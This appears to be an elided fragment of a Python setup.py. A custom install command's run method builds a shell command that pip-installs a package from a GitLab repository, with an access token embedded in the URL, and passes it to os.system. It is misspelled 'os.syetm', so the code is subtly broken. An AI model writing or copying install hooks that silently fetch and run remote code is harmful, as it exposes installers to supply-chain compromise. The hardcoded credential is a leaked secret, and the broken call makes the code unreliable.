    ...
    class PostCMD(install):
          ...
          def  run(self):
              ...
              def  cleanup_function(siteOP):
                  import os
                  print(f'pip install "git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git#egg=S{Var.nameA}==v{Var.nameB}"  ')
                  os.syetm(f'pip install "git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git#egg=S{Var.nameA}==v{Var.nameB}"  ')      
